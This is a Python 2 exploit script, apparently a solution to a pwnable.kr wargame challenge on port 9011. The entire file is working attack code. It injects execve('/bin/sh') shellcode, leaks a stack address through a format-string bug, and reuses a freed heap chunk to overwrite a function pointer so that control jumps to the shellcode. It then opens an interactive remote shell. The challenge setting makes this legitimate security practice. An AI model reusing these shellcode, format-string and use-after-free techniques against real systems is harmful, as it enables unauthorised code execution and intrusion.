import socket
import sys
import struct
import time

def read_until(word):
    data = ''
    letterIndex = 0
    letter = word[0]
    while word != data:
        character = s.recv(1)
        sys.stdout.write(character)
        if character == letter:
            data+=character
            letterIndex+=1
            if letterIndex < len(word):
                letter = word[letterIndex]
        else:
            data = ''
            letterIndex = 0
            letter = word[letterIndex]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('pwnable.kr', 9011))

shellcode = "\x31\xf6\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

# place jmp asm in id
read_until(':')
s.send(shellcode + "\n")
read_until(">")

# read where name is stored on stack
s.send("2\n")
read_until("\n")
s.send("%10$llu\n")
name_addr = int(s.recv(15)) - 0x20
read_until(">")

# free initial malloc
s.send("4\n")
read_until(")")
s.send("n\n")

# re-allocate unallocated memory (replace greetings function with shellcode jump)
read_until(">")
s.send("3\n")
read_until("\n")
s.send("A"*0x18 + struct.pack("<Q",name_addr)) 
read_until(">")

# call fsb which wil jmp to shellcode now
s.send("2\n")
print s.recv(512)

s.settimeout(0.2)
while(True):
    try:
        time.sleep(0.1)
        sys.stdout.write(s.recv(512))
    except:
        s.send(raw_input() + "\n")



